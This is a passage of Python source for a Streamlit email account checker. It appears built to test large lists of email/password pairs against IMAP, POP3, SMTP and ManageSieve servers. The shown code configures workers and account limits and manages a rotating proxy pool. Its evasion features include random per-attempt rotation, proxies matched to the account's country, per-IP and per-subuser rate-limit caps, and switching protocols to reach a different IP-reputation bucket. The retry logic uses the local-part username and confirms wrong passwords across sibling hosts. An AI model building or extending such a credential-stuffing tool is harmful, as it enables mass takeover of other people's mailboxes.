                                  connect_timeout=12.0, max_retries=4, failure_cooldown=20.0)
    workers = str_lit.sidebar.slider("Workers Start", 1, 50, step=1, key="ui_workers")
    deadline = str_lit.sidebar.slider("Deadline (Seconds)", 15, 400, step=5,
                                      key="ui_deadline")
    timeout = str_lit.sidebar.slider("Timeout", 5, 60, step=1, key="ui_timeout")
    default_hosts = 4
else:
    engine_config = CheckerConfig(mode_name="Normal", fast_mode=False, max_concurrent_checks=50,
                                  connect_timeout=8.0, max_retries=2,
                                  failure_cooldown=FAILURE_COOLDOWN_DEFAULT)
    workers = str_lit.sidebar.slider("Workers Start", 1, 100, step=1, key="ui_workers")
    deadline = str_lit.sidebar.slider("Deadline (Seconds)", 10, 300, step=5,
                                      key="ui_deadline")
    timeout = str_lit.sidebar.slider("Timeout", 3, 40, step=1, key="ui_timeout")
    default_hosts = 3
max_acc = str_lit.sidebar.slider("Max Accounts", 0, 5000, step=100, key="ui_max_acc")
blacklist_cf = str_lit.sidebar.slider(
    "Blacklist CF (consecutive proxy fails)", 3, 100, step=1,
    key="ui_blacklist_cf",
    help="A proxy is circuit-broken for 30s after this many consecutive network failures."
)
# @@END 046 SIDEBAR_MODE

# @@BLOCK 047 SIDEBAR_PROTOCOLS deps=011,019,046
_seed_widget("ui_protocols", choices=PROTOCOL_OPTIONS)
protocol_pick = str_lit.sidebar.multiselect(
    "🧩 Pick Protocols Mode",
    options=PROTOCOL_OPTIONS,
    key="ui_protocols",
    help="Which protocols the engine is allowed to DIAL. DEFAULT IS IMAP + POP3 - POP3 is "
         "the only independent path when a legacy IMAP front answers LOGIN with '* BYE' "
         "and hangs up.\n\n"
         "IMAP - 993 (TLS) / 143 (STARTTLS / plain). The default and the one that matters "
         "most.\n"
         "POP3 - 995 (TLS) / 110 (STLS / plain). A completely separate code path: "
         "different port, different daemon, different IP-reputation bucket.\n"
         "SMTP - submission AUTH on 587 -> 465 -> 25. CONFIRM-ONLY.\n"
         "ManageSieve - 4190. CONFIRM-ONLY, same credentials, sometimes open when IMAP is not."
)
if not protocol_pick:
    str_lit.sidebar.caption("⚠ Nothing ticked - falling back to IMAP.")
else:
    str_lit.sidebar.caption(
        "Dialling: **" + " + ".join(protocol_pick) + "**"
        + ("  ·  SMTP/ManageSieve are confirm-only"
           if any(p in ("SMTP", "ManageSieve") for p in protocol_pick) else ""))
# @@END 047 SIDEBAR_PROTOCOLS

# @@BLOCK 048 SIDEBAR_RULES deps=019,046
str_lit.sidebar.markdown("---")
str_lit.sidebar.markdown("### 🎛 Advanced Control Rules")
_seed_widget("ui_dynamic_scaling")
dynamic_worker_scaling = str_lit.sidebar.toggle(
    "⚡ Thread Auto-Scaling / Dynamic Workers", key="ui_dynamic_scaling",
    help="OFF = FIXED WORKERS. The run uses exactly your Workers Start for the "
         "whole run, nothing changes it. This is the setting to use when you want "
         "N accounts checked at once.\n\n"
         "ON = the count is TUNED ONCE, before the first account: raised up to "
         "2x for a queue over 500, and cut down to the queue length for a queue "
         "under 20 (so a 5-line resume runs 5, not 12). It is not re-tuned while "
         "the run is in progress.\n\n"
         "Either way you must press 💾 Apply Settings - the engine reads the "
         "applied config, not the slider.")
_seed_widget("ui_max_hosts", lo=1, hi=8, dflt=default_hosts)
# FIX W-3 (v13.67): the positional default `1` was still here while
# _seed_widget() had already written the key from this user's settings.json, so
# EVERY load logged
#   The widget with key "ui_max_hosts" was created with a default value but also
#   had its value set via the Session State API.
# (app.py:3956 in the deployed traceback). The seed carries the mode default, so
# the positional value was doing nothing but warning.
max_hosts_per_domain = str_lit.sidebar.slider(
    "Max Hosts Per Domain", 1, 8, key="ui_max_hosts",
    help="How many discovered IMAP hosts to try per account. 1 = primary host only. "
         "Each extra host adds a rung and lengthens the per-account work floor, so LOWER "
         "is FASTER - raise it only for domains whose sibling hosts actually answer. "
         "STARTTLS / plain and POP rungs are capped separately."
)
_seed_widget("ui_alt_user")
try_alt_username_ui = str_lit.sidebar.toggle(
    "Try local-part username on auth failure", key="ui_alt_user",
    help="Many legacy ISP servers (Zimbra / cPanel / Dovecot) expect 'user' rather than "
         "'user@domain'. On an auth rejection the engine holds the node and retries the "
         "SAME host with the local part. This also fires on a LOGIN_DROPPED (* BYE), not "
         "just WRONG. Not applied to SMTP."
)
_seed_widget("ui_confirm_wrong")
confirm_wrong_ui = str_lit.sidebar.toggle(
    "✅ Confirm a WRONG verdict across hosts before accepting it",
    key="ui_confirm_wrong",
    help="GUARD. ON (default): a single AUTHENTICATIONFAILED is PROVISIONAL - the ladder "
         "keeps going (POP3, the sibling hosts, 143/110, then DIRECT) until a SECOND host "
         "agrees or nothing is left to dial. A single host is NOT authoritative: "
         "imap.<domain> is often a different box from the mailbox's real host, and it "
         "answers AUTHENTICATIONFAILED for accounts it has never heard of. OFF: restore "
         "the one-rung behaviour (faster on huge lists, more false wrong_password)."
)

_seed_widget("ui_smtp_precheck")
smtp_precheck_ui = str_lit.sidebar.checkbox(
    "📮 Enable SMTP pre-check  (OFF by default)",
    key="ui_smtp_precheck",
    help="A REACHABILITY banner probe only (220 on 587/465/25) - it never authenticates. "
         "Separate from the SMTP protocol rung in Pick Protocols Mode, which does AUTH PLAIN."
)

# FIX ISO-7 (v13.61): these two had NO key, so they were the only settings that
# could be neither remembered across a refresh nor reset to a default.
custom_whitelist_input = str_lit.sidebar.text_input(
    "Custom Whitelist Domains (comma-separated)", placeholder="gmail.com, outlook.com",
    key="bb_whitelist")
custom_blacklist_input = str_lit.sidebar.text_input(
    "Custom Blacklist Domains (comma-separated)", placeholder="spamdomain.com",
    key="bb_blacklist")
# @@END 048 SIDEBAR_RULES

# @@BLOCK 049 SIDEBAR_POOL deps=016,017,018,019,046
str_lit.sidebar.markdown("---")
str_lit.sidebar.markdown("### 🌐 Proxy / Pool Configuration")
# FIX SCORE-4: this slider was `step=10` against a default of 5, so it could not
# SIT on 5 - it snapped to 0 or 10 and the default was never actually applied.
# 0 means "no score filtering at all", which is the opposite of what the label
# promises. Step 1.
# FIX W-3 (v13.67): and the positional default is gone for the same reason as
# block 048 - _seed_widget() already wrote the key.
_seed_widget("ui_min_proxy_score", lo=0, hi=100)
min_proxy_score = str_lit.sidebar.slider(
    "Min Proxy Score", 0, 100, key="ui_min_proxy_score",
    help="A node is dropped from the pool once its score falls below this. A node that "
         "has EVER passed the probe is never dropped by score, and a 402/407 no longer "
         "counts as a fail - only real transport failures do."
)
_seed_widget("ui_probe_precheck_timeout", lo=1, hi=10)
proxy_precheck_timeout = str_lit.sidebar.slider(
    "Proxy Pre-Check Timeout (Sec)", 1, 10,
    key="ui_probe_precheck_timeout"
)
_seed_widget("ui_probe_timeout", lo=3, hi=20)
probe_timeout_ui = str_lit.sidebar.slider(
    "Tunnel Probe Timeout (Sec)", 3, 20, key="ui_probe_timeout",
    help="How long a node gets IN TOTAL to open a real CONNECT tunnel to any probe target."
)
_seed_widget("ui_probe_target", choices=PROBE_TARGET_OPTIONS)
probe_target_ui = str_lit.sidebar.selectbox(
    "Tunnel Probe Target",
    PROBE_TARGET_OPTIONS,
    key="ui_probe_target",
    help="DEFAULT '443 (HTTPS)': the probe dials api.ipify.org:443, which is not a "
         "mail server. Keep it - a 407 on 443 is unambiguously about the credential "
         "or the plan, while a 407 on 993 is not, so 443 is the only clean baseline. "
         "The mail-destination spot check below is what tests 993, and it proves "
         "itself against 443 before it blames the node."
)
_seed_widget("ui_probe_strict")
probe_strict_ui = str_lit.sidebar.toggle(
    "Strict tunnel probe", key="ui_probe_strict",
    help="ON (default): only nodes that PASS the tunnel probe enter the live pool, so "
         "'Alive: 0' means it. ONE exception, and it is deliberate: a node that answers "
         "402 Payment Required is ALIVE and authenticated - the provider is only refusing "
         "service - so it is kept, parked for ten minutes and drawn only when no passing "
         "node is left. OFF: a failed probe is not fatal and the raw filtered pool is "
         "armed unvalidated instead."
)
_seed_widget("ui_probe_maxtargets", lo=1, hi=3)
probe_max_targets_ui = str_lit.sidebar.slider(
    "Probe: max targets per node", 1, 3, key="ui_probe_maxtargets",
    help="1 (default) = AUTO resolves the SINGLE dominant mail host in your queue."
)
_seed_widget("ui_probe_scheme2")
probe_second_scheme_ui = str_lit.sidebar.toggle(
    "Probe: also try the second proxy scheme",
    key="ui_probe_scheme2",
    help="OFF (default) = one CONNECT per probe when the first scheme PASSES. The alternate "
         "scheme is ALWAYS tried after a FAILURE regardless of this switch, except after a "
         "402/407 where another scheme cannot change the answer."
)
_seed_widget("ui_prober_idle")
prober_idle_ui = str_lit.sidebar.toggle(
    "Probe: keep probing in the background while idle",
    key="ui_prober_idle",
    help="OFF (default) = the pool is probed once when the page loads, then only when you "
         "click Start or Re-probe."
)
_seed_widget("ui_mail_spot")
mail_spot_ui = str_lit.sidebar.toggle(
    "✉️ Spot-check the pool against a MAIL destination",
    key="ui_mail_spot",
    help="After every probe cycle, CONNECT 3 random nodes to your first queued mail host "
         "(fallback imap.gmail.com:993) and report it. Each 407 is re-tested against 443 "
         "before it is blamed on the node, so a healthy node is never quarantined for a "
         "destination-scoped 407."
)
_seed_widget("ui_probe_sample", lo=0, hi=200)
probe_sample_ui = str_lit.sidebar.slider(
    "Probe: max nodes per cycle (0 = all)", 0, 200, key="ui_probe_sample",
    help="Randomly sample this many nodes per cycle instead of probing the whole file. "
         "Cheapest is 20."
)
_seed_widget("ui_dedupe")
dedupe_proxies_ui = str_lit.sidebar.toggle(
    "Deduplicate proxy pool", key="ui_dedupe",
    help="ON (default): collapse repeated host:port lines in proxies.txt. The live pool is "
         "ALWAYS collapsed to one line per host:port regardless, keeping whichever line "
         "passed - eleven sub-users on one IP are one proxy, not eleven."
)
_seed_widget("ui_allow_blacklist")
allow_blacklist_ips = str_lit.sidebar.toggle(
    "Allow Blacklisted / Flagged Proxy IPs", key="ui_allow_blacklist",
    help="When disabled (default), circuit-broken proxies are excluded from BOTH the pool "
         "AND the live ladder."
)
_seed_widget("ui_quarantine")
proxy_quarantine_ui = str_lit.sidebar.toggle(
    "🩹 Quarantine nodes that return 407", key="ui_quarantine",
    help="ON (default): a node that answers '407 Proxy Authentication Required' THREE "
         "times is pulled out of the pool for the rest of the run. A plain socket reset "
         "is NOT a 407, a 402 is NOT a 407, and a 407 that passes the 443 control does "
         "not count at all."
)
# @@END 049 SIDEBAR_POOL

# @@BLOCK 050 SIDEBAR_CONCURRENCY deps=012,017,019,046
str_lit.sidebar.markdown("---")
str_lit.sidebar.markdown("### 🚦 Concurrency Governors")
# FIX W-3 (v13.67): every slider below had a positional default next to a key=
# that block 045 has already seeded, so each one warned on every load. Removed.
_seed_widget("ui_host_conc", lo=1, hi=12)
host_concurrency_ui = str_lit.sidebar.slider(
    "Per-Host Connection Cap", 1, 12, key="ui_host_conc",
    help="Max simultaneous connections to ONE mail hostname. 2 is right for legacy ISP IMAP."
)
_seed_widget("ui_ip_conc", lo=1, hi=12)
proxy_ip_concurrency_ui = str_lit.sidebar.slider(
    "Per-Proxy-IP Connection Cap", 1, 12, key="ui_ip_conc",
    help="Default 2. Max simultaneous tunnels through ONE proxy IP, for the CHECKER and "
    "the PROBER alike."
)
_seed_widget("ui_subuser_conc", lo=1, hi=12)
proxy_subuser_concurrency_ui = str_lit.sidebar.slider(
    "Per-Proxy-SUBUSER Connection Cap", 1, 12,
    key="ui_subuser_conc",
    help="Default 1. Providers rate-limit PER SUB-USER - a 407 is what you get when that "
         "cap is exceeded, NOT because the node is dead. 1 is a real floor now; the gate "
         "used to be silently pinned at 2 no matter what you dragged."
)
_seed_widget("ui_proxy_conc", lo=2, hi=60)
proxy_concurrency_ui = str_lit.sidebar.slider(
    "Global Proxy Connection Cap", 2, 60, key="ui_proxy_conc",
    help="Max simultaneous proxy tunnels across the whole run (the prober shares this)."
)
_seed_widget("ui_direct_first")
direct_first_ui = str_lit.sidebar.toggle(
    "⚡ Direct-First (try the direct egress before the proxy)",
    key="ui_direct_first",
    help="ON: run the DIRECT sweep first and only fall back to the proxy. Also auto-engages "
         "per account when >50% of the pool is quarantined."
)
_seed_widget("ui_same_host_retries", lo=0, hi=4)
same_host_retries_ui = str_lit.sidebar.slider(
    "Same-Host Retries on a SLOW answer", 0, 4,
    key="ui_same_host_retries",
    help="Only applies to READ-level slowness."
)
_seed_widget("ui_max_rot", lo=0, hi=8)
max_rotations_ui = str_lit.sidebar.slider(
    "Max proxy rotations per rung", 0, 8, key="ui_max_rot",
    help="Every rotation is another proxy request. 5 -> 2 is roughly a 60% cut in the "
         "worst case."
)
_seed_widget("ui_pass2")
pass2_ui = str_lit.sidebar.toggle(
    "Second pass over network-failed hosts", key="ui_pass2",
    help="OFF (default) = one pass over the ladder. ON = re-dial every host that failed "
         "with a NETWORK error."
)
# @@END 050 SIDEBAR_CONCURRENCY

# @@BLOCK 051 SIDEBAR_ROUTING deps=019,046
str_lit.sidebar.markdown("---")
str_lit.sidebar.markdown("### 🔀 Proxy Routing Intelligence")
_seed_widget("ui_random_rot")
proxy_random_rotation = str_lit.sidebar.toggle(
    "🔀 Proxy Random Rotation", key="ui_random_rot",
    help="ON (default): a DIFFERENT random node is used for every attempt, with a "
         "per-account avoid-set."
)
_seed_widget("ui_geo_call")
geo_call_proxy = str_lit.sidebar.toggle(
    "🌍 Geo-Call Proxy", key="ui_geo_call",
    help="Prefer a node whose geo matches the email's country/region. Falls back to the "
         "general pool on failure."
)
_seed_widget("ui_conn_hint", choices=("Auto", "VPN ON", "VPN OFF"))
my_connection = str_lit.sidebar.selectbox(
    "📶 My own connection (stamped on direct fallbacks)", ["Auto", "VPN ON", "VPN OFF"],
    key="ui_conn_hint", help="Diagnostic only.")
# @@END 051 SIDEBAR_ROUTING

# @@BLOCK 052 CACHE_PROXY_PARSE_PICKER deps=007,024,039,051
if "pool_mode" not in str_lit.session_state:
    str_lit.session_state.pool_mode = "all"
if "pool_locked" not in str_lit.session_state:
    str_lit.session_state.pool_locked = True
if "picked_countries" not in str_lit.session_state:
    str_lit.session_state.picked_countries = []


def load_json(path, default=None):
    if default is None:
        default = {}
    if os.path.exists(path):
        try:
            with open(path, encoding="utf-8") as f:
                data = json.load(f)
                log_startup(f"Successfully loaded JSON cache from {path}.")
                return data
        except Exception as e:
            log_startup(f"WARNING: Failed to load JSON file {path}: {e}")
            return default
    log_startup(f"JSON cache file {path} not found. Using default.")
    return default


# FIX ISO-6: this user's own domain cache file, and their own proxy meta table.
# v13.65: IT WAS READING THE SHARED FILE. This block runs at import, BEFORE block
# 055 defines CFG, and the module namespace is rebuilt on every rerun - so
# live_cfg() is {} here, .get("CACHE_FILE") is None, and the BARE
# domain_cache.json was loaded on every single load while save_domain_cache()
# wrote the per-user one. The path is resolved through user_file() directly now.
domain_cache = load_json(user_file("domain_cache.json"), {})
proxy_meta = _user_state()["proxy_meta"]

# ==========================================================================
# v13.64 - THE META FILE WAS WRITE-ONLY
#
# save_proxy_meta() has always written proxy_meta.json and NOTHING has ever read
# it back. Every score, every country, every "this node has delivered before"
# success count and every park died with the process - so a refresh handed the
# engine a table of blank rows at the 80 default, and the "a node that ever
# passed is never dropped by score" rescue in block 058 could not fire because
# nothing on disk was ever loaded.
#
# The same file now also carries the last probe verdict per node and the park
# clock, because the tier gate in block 069 reads probe_stats - and probe_stats
# was memory-only too. Without them a reload re-flattens the pool until the
# first probe cycle finishes, which is the exact "my pool resets itself" symptom.
#
# THREE RULES, and they are the whole safety of this:
#   1. LIVE WINS. A field already in the table is never overwritten.
#   2. THE FILE IS FILTERED ON READ. Only lines still in this user's proxies.txt
#      are restored, so a stale file cannot resurrect a deleted node.
#   3. A SEEDED VERDICT AGES OUT. After _PROBE_SEED_TTL the reason is dropped
#      (the score, country and counters stay) so a week-old "ok" cannot pin a
#      node above a fresh measurement for ever.
# ==========================================================================
_PROXY_META_SCHEMA = 2
_PROBE_SEED_TTL = 6 * 3600.0


def _proxy_meta_path() -> str:
    """This user's own meta file. Never bare, even before CFG exists."""
    try:
        return live_cfg().get("PROXY_META_FILE") or user_file("proxy_meta.json")
    except Exception:
        return user_file("proxy_meta.json")


def _load_proxy_meta_file() -> int:
    """Restore scores, countries, counters, verdicts and parks. Once per scope."""
    _scope = _gate_scope()
    _done = STATE.setdefault("proxy_meta_loaded", set())
    if _scope in _done:
        return 0
    _done.add(_scope)

    _path = _proxy_meta_path()
    if not os.path.exists(_path):
        return 0
    try:
        with open(_path, encoding="utf-8") as f:
            data = json.load(f)
    except Exception as e:
        log_startup(f"WARNING: {os.path.basename(_path)} unreadable ({e}); "
                    f"starting from a cold table.")
        return 0
    if not isinstance(data, dict):
        return 0

    # New envelope, or the legacy flat dict written by every build before this one.
    if isinstance(data.get("meta"), dict):
        meta_in = data.get("meta") or {}
        probe_in = data.get("probe") if isinstance(data.get("probe"), dict) else {}
        park_in = data.get("parked") if isinstance(data.get("parked"), dict) else {}
    else:
        meta_in, probe_in, park_in = data, {}, {}

    # v13.65: THIS LINE WAS ALWAYS EMPTY. The call used to sit ABOVE
    # def load_proxies, so it raised NameError, the bare except swallowed it and
    # `known` was set() on every run - rule 2 above never applied and a deleted
    # node came back from the file.
    # v13.66: and it is read from THIS user's file directly, not through
    # load_proxies() -> live_cfg(), which can still be answering with the
    # previous run's CFG on a second unlock in the same process.
    try:
        _kp = user_file("proxies.txt")
        if os.path.exists(_kp):
            with open(_kp, encoding="utf-8", errors="ignore") as _kf:
                known = {l.strip() for l in _kf
                         if l.strip() and not l.strip().startswith("#")}
        else:
            known = set()
    except Exception:
        known = set()

    now = time.time()
    restored = 0
    with proxy_lock:
        for _p, _m in meta_in.items():
            if not isinstance(_m, dict) or not _p:
                continue
            if known and _p not in known:
                continue
            _tgt = proxy_meta.setdefault(_p, {})
            for _k in ("fails", "success", "plan", "latency_ms", "country", "region",
                       "score"):
                if _k not in _tgt and _k in _m:
                    _tgt[_k] = _m[_k]
            restored += 1

    seeded = 0
    with probe_stats_lock:
        for _p, _r in probe_in.items():
            if not isinstance(_r, dict) or not _p or _p in probe_stats:
                continue
            if known and _p not in known:
                continue
            try:
                _ts = float(_r.get("ts") or 0.0)
            except Exception:
                _ts = 0.0
            if not _ts or (now - _ts) > _PROBE_SEED_TTL:
                continue
            probe_stats[_p] = dict(_r)
            seeded += 1

    parks = 0
    for _p, _until in park_in.items():
        try:
            _u = float(_until)
        except Exception:
            continue
        if _u > now and (not known or _p in known):
            proxy_407_until[_p] = _u
            parks += 1

    log_startup(f"Restored {restored} node record(s), {seeded} probe verdict(s) and "
                f"{parks} park(s) from {os.path.basename(_path)} "
                f"(live values kept).", quiet=True)
    if seeded:
        log_probe_event(f"pool state restored from disk: {seeded} verdict(s) - the "
                        f"tier gate is live before the first probe")
    return restored


def _proxy_path() -> str:
    # v13.65: the fallback is the USER's file, not a bare name. This is called
    # before CFG exists (import time) as well as after it, and a bare fallback
    # made load_proxies() create a shared proxies.txt in the working directory.
    try:
        return live_cfg().get("PROXY_FILE") or user_file("proxies.txt")
    except Exception:
        return user_file("proxies.txt")


def load_proxies(quiet: bool = False):
    """Proxies come from THIS USER's proxies.txt only."""
    _path = _proxy_path()
    if not os.path.exists(_path):
        try:
            with file_write_lock:
                with open(_path, "w", encoding="utf-8") as f:
                    if OXYLABS_PROXIES:
                        f.write("\n".join(OXYLABS_PROXIES) + "\n")
            log_startup(f"Created {_path} (seeded from secrets: "
                        f"{len(OXYLABS_PROXIES)}).", quiet=quiet)
        except Exception as e:
            log_startup(f"WARNING: Failed to initialize {_path}: {e}", quiet=quiet)
    try:
        with open(_path, encoding="utf-8", errors="ignore") as f:
            raw_list = [l.strip() for l in f if l.strip() and not l.startswith("#")]
        try:
            dedupe = bool(CFG.get("DEDUPE_PROXIES", DEDUPE_PROXIES_DEFAULT))
        except Exception:
            dedupe = DEDUPE_PROXIES_DEFAULT
        if dedupe:
            uniq = list(dict.fromkeys(raw_list))
            if len(uniq) != len(raw_list):
                log_startup(f"Loaded {len(raw_list)} proxies from {_path} "
                            f"({len(uniq)} unique after dedupe).", quiet=quiet)
            raw_list = uniq
        else:
            log_startup(f"Loaded {len(raw_list)} proxies from {_path}.", quiet=quiet)
        return raw_list
    except Exception as e:
        log_startup(f"WARNING: Failed to read {_path}: {e}", quiet=quiet)
        return []


def compute_real_score(success_count, fail_count, initial_latency_score=80):
    try:
        if (success_count + fail_count) == 0:
            return initial_latency_score
        sr = ((success_count + 2) / (success_count + fail_count + 3)) * 100
        return max(0, min(100, int(sr - (fail_count * 5))))
    except Exception:
        return initial_latency_score


def is_proxy_alive(proxy_host, proxy_port, timeout=2):
    try:
        with socket.create_connection((proxy_host, int(proxy_port)), timeout=timeout):
            return True
    except Exception:
        return False


def parse_proxy(proxy_str):
    if not proxy_str:
        return None
    try:
        p = proxy_str.strip()
        if "://" in p:
            u = urlparse(p)
            return {"host": u.hostname, "port": u.port or 80,
                    "user": u.username, "pass": u.password}
        if "@" in p:
            cred, hostpart = p.rsplit("@", 1)
            user, pwd = cred.split(":", 1)
            host, port = hostpart.split(":", 1)
            return {"host": host, "port": int(port), "user": user, "pass": pwd}
        parts = p.split(":")
        if len(parts) == 4:
            return {"host": parts[0], "port": int(parts[1]),
                    "user": parts[2], "pass": parts[3]}
        if len(parts) == 2:
            return {"host": parts[0], "port": int(parts[1]), "user": None, "pass": None}
    except Exception:
        pass
    return None


# The restore now has load_proxies() AND parse_proxy() above it, so its
# "only lines still in proxies.txt" filter is real.
_load_proxy_meta_file()


# v13.64: BOTH OF THESE ARE CALLED FROM WORKER THREADS - quarantine_proxy() from
# the probe pool and from the sweep, proxy_is_quarantined() from sample_alive_proxy
# and from every rung. Module globals are ONE namespace for the whole process and
# a rerun in another tab rebinds them, so without _rebind_scope() a worker could
# read the other user's quarantine set - and quarantine a node into it.
def proxy_is_quarantined(proxy_str) -> bool:
    if not proxy_str:
        return False
    _rebind_scope()
    with proxy_quarantine_lock:
        return proxy_str in proxy_quarantine


def quarantine_proxy(proxy_str, reason=""):
    if not proxy_str:
        return False
    _rebind_scope()
    with proxy_quarantine_lock:
        if proxy_str in proxy_quarantine:
            return False
        proxy_quarantine.add(proxy_str)
        size = len(proxy_quarantine)
    with alive_pool_lock:
        total = len(alive_pool)
    log_startup(f"Proxy quarantined ({reason or '407'}): {proxy_str} "
                f"[{size} quarantined / {total} alive]", quiet=True)
    log_probe_event(f"QUARANTINE {proxy_str} ({reason or '407'}) [{size}/{total}]")
    return True


def quarantine_size() -> int:
    """Count of THIS session's quarantined nodes.

    v13.70 ISO-12: this was the one quarantine helper WITHOUT _rebind_scope(),
    and it is called from worker threads (blocks 100, 103 and 104 read it
    mid-account). A rerun in another tab rebinds the module alias, so the count
    came back as the other session's - which is a displayed number AND the input
    to block 103's auto-Direct-First threshold at 50% of the pool.
    """
    _rebind_scope()
    with proxy_quarantine_lock:
        return len(proxy_quarantine)


def clear_proxy_quarantine():
    _rebind_scope()
    with proxy_quarantine_lock:
        proxy_quarantine.clear()
    _proxy_407.clear()
    try:
        proxy_407_until.clear()
    except Exception:
        pass
    log_probe_event("quarantine cleared by user")


def _scheme_order(proxy_str):
    """Try the scheme that last worked for this node FIRST. HTTP is the default."""
    with _proxy_scheme_lock:
        pref = _proxy_scheme.get(proxy_str)
    if pref == socks.SOCKS5:
        return (socks.SOCKS5, socks.HTTP)
    return (socks.HTTP, socks.SOCKS5)


def _remember_scheme(proxy_str, ptype):
    with _proxy_scheme_lock:
        _proxy_scheme[proxy_str] = ptype


# ---------------------------------------------------------------------------
# v13.54 GEO FIX
# ---------------------------------------------------------------------------
# GEO_MAX_WAIT bounds one reservation so a queued caller cannot be parked for
# ever, and the sleep below equals the wait so the reservation and the real gap
# agree. GEO_TRIES_MAX stops a node that will never answer from being re-asked
# on every single cycle.
GEO_MAX_WAIT = 6.0
GEO_TRIES_MAX = 3
_GEO_TRIES = STATE.setdefault("geo_tries", {})


def geo_lookup(ip):
    """Country/region for an IP.

    THREE DEFECTS FIXED HERE.

    1. The throttle reserved the full interval but slept `min(wait, 3.0)`, so
       the timestamp ran ahead of the real gap and a batch outran ip-api's
       45/min tier - every lookup after the first few came back 429. The
       reservation is bounded by GEO_MAX_WAIT and the sleep now equals it.
    2. A 429 or a transient network error poisoned the IP for GEO_FAIL_TTL
       (300s) across every session, because _GEO_FAIL is STATE-backed. A 429 is
       now retried once inside the same call and only a real, repeated failure
       is cached.
    3. ip-api answers status=fail with "private range" / "reserved range" for
       addresses that will never have geo. Those are a real answer, so they are
       cached instead of being asked again for ever.

    Returns ("Unknown", "Unknown") on failure, exactly as before, so every
    existing caller keeps working unchanged. Whether an Unknown is allowed to
    overwrite a known country is enrich_proxy_geo()'s decision, not this
    function's.
    """
    if not ip or ip == "Unknown":
        return ("Unknown", "Unknown")
    now = time.time()
    with _GEO_LOCK:
        hit = _GEO_CACHE.get(ip)
        if hit:
            return hit
        failed = _GEO_FAIL.get(ip)
        if failed and (now - failed) < GEO_FAIL_TTL:
            return ("Unknown", "Unknown")
        reserve = max(float(_geo_last_call.get("ts", 0.0)), now) + GEO_MIN_INTERVAL
        wait = reserve - now
        if wait < 0.0:
            wait = 0.0
        if wait > GEO_MAX_WAIT:
            wait = GEO_MAX_WAIT
        _geo_last_call["ts"] = now + wait
    if wait > 0.0:
        time.sleep(wait)

    country, region = "Unknown", "Unknown"
    ok = False
    permanent = False
    attempt = 0
    while attempt < 2 and not ok:
        attempt += 1
        if requests is None:
            break
        try:
            r = requests.get(
                f"http://ip-api.com/json/{ip}?fields=status,country,regionName,message",
                timeout=4)
            if r.status_code == 429:
                if attempt < 2:
                    time.sleep(1.2)
                continue
            if r.status_code != 200:
                break
            data = r.json() or {}
            if data.get("status") == "success":
                country = data.get("country") or "Unknown"
                region = data.get("regionName") or "Unknown"
                ok = True
                break
            msg = str(data.get("message") or "").lower()
            if "private" in msg or "reserved" in msg or "invalid" in msg:
                permanent = True
            break
        except Exception:
            if attempt < 2:
                time.sleep(0.6)

    with _GEO_LOCK:
        if ok:
            _GEO_CACHE[ip] = (country, region)
            _GEO_FAIL.pop(ip, None)
        elif permanent:
            _GEO_CACHE[ip] = ("Unknown", "Unknown")
            _GEO_FAIL.pop(ip, None)
        else:
            _GEO_FAIL[ip] = time.time()
    return country, region


def public_ip(force=False):
    if not force and _PUBLIC_IP["ip"] and time.time() - _PUBLIC_IP["ts"] < GEO_CACHE_TTL:
        return _PUBLIC_IP["ip"]
    with _PUBLIC_IP_LOCK:
        if not force and _PUBLIC_IP["ip"] and time.time() - _PUBLIC_IP["ts"] < GEO_CACHE_TTL:
            return _PUBLIC_IP["ip"]
        ip = ""
        try:
            if requests is not None:
                ip = (requests.get("https://api.ipify.org", timeout=3).text or "").strip()
        except Exception:
            ip = ""
        if not ip:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.connect(("8.8.8.8", 80))
                ip = s.getsockname()[0]
                s.close()
            except Exception:
                ip = ""
        if ip:
            _PUBLIC_IP.update(ip=ip, ts=time.time())
        return ip or "Unknown"


def direct_isp(force=False):
    if not force and _DIRECT_ISP["isp"] and time.time() - _DIRECT_ISP["ts"] < GEO_CACHE_TTL:
        return _DIRECT_ISP["isp"]
    ip = public_ip()
    isp = ""
    try:
        if requests is not None and ip and ip != "Unknown":
            r = requests.get(f"http://ip-api.com/json/{ip}?fields=status,isp,org,as", timeout=3)
            if r.status_code == 200:
                data = r.json()
                if data.get("status") == "success":
                    isp = " ".join(str(data.get(k) or "") for k in ("isp", "org", "as")).strip()
    except Exception:
        isp = ""
    _DIRECT_ISP.update(isp=isp, ts=time.time())
    return isp


_VPN_BRANDS = (
    "vpn", "nordvpn", "mullvad", "proton", "expressvpn", "surfshark", "cyberghost",
    "private internet", "ipvanish", "windscribe", "tunnelbear", "hide.me", "purevpn",
    "astrill", "vyprvpn", "hotspot shield", "ivacy", "torguard", "perfect privacy",
    "azirevpn", "airvpn", "openvpn", "wireguard",
)


def vpn_state_label():
    """Say so when the lookup failed instead of asserting VPN OFF."""
    hint = CFG.get("CONNECTION_HINT", "Auto")
    if hint in ("VPN ON", "VPN OFF"):
        return hint
    isp = (direct_isp() or "").lower()
    if not isp:
        return "VPN ? (lookup failed)"
    if any(t in isp for t in _VPN_BRANDS):
        return "VPN ON (auto)"
    return "VPN OFF (auto)"


def direct_geo(force=False):
    if not force and time.time() - _DIRECT_GEO["ts"] < GEO_CACHE_TTL and _DIRECT_GEO["ip"]:
        return dict(_DIRECT_GEO)
    with _DIRECT_GEO_LOCK:
        if not force and time.time() - _DIRECT_GEO["ts"] < GEO_CACHE_TTL and _DIRECT_GEO["ip"]:
            return dict(_DIRECT_GEO)
        ip = public_ip(force=force)
        country, region = geo_lookup(ip)
        _DIRECT_GEO.update(ts=time.time(), ip=ip, country=country,
                           region=region, vpn=vpn_state_label())
        return dict(_DIRECT_GEO)


TLD_COUNTRY = {
    "de": "Germany", "at": "Austria", "ch": "Switzerland", "fr": "France",
    "it": "Italy", "es": "Spain", "pt": "Portugal", "nl": "Netherlands",
    "be": "Belgium", "pl": "Poland", "se": "Sweden", "no": "Norway",
    "dk": "Denmark", "fi": "Finland", "ie": "Ireland", "cz": "Czechia",
    "sk": "Slovakia", "gr": "Greece", "ro": "Romania", "hu": "Hungary",
    "uk": "United Kingdom", "gb": "United Kingdom", "ca": "Canada",
    "us": "United States", "au": "Australia", "nz": "New Zealand",
    "br": "Brazil", "mx": "Mexico", "ar": "Argentina", "cl": "Chile",
    "jp": "Japan", "kr": "South Korea", "in": "India", "tr": "Turkey",
    "za": "South Africa", "ru": "Russia", "ua": "Ukraine", "il": "Israel",
    "lt": "Lithuania", "lv": "Latvia", "ee": "Estonia", "bg": "Bulgaria",
    "hr": "Croatia", "si": "Slovenia", "rs": "Serbia",
}


def tld_country(domain):
